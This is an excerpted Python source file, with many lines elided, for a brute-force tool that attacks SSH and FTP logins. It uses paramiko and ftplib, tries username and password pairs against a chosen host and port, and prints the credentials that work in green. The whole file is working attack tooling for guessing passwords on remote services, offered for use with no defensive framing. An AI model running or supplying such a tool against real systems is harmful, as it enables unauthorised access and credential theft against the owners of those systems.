...
# 
import paramiko,argparse,ftplib
...
def get_args():
    ...
    parser.add_argument('-p','--port',dest='port',type=int,required=False,help="Port to attack on, Default:22 for ssh and 21 for Ftp")
...
def ssh_bruteforce(host,username,password,port):
    ...
    try:
    # trying to  connect 
        ssh.connect(host,port=port,username=username,password=password,banner_timeout=800)
    except:
        print(f"[Attempt] target {host} - login:{username} - password:{password}")
    else:
        print(colored(f"[{port}] [ssh] host:{host}  login:{username}  password:{password}\n",'green'))
...
def ftp_bruteforce(host,username,password,port):
    ...
    try:
        ...
        print(colored(f"[{port}] [ftp] host:{host}  login:{username}  password:{password}\n",'green'))
        with q.mutex:
            # clearing the queue
            q.queue.clear()
            q.all_tasks_done.notify_all()   
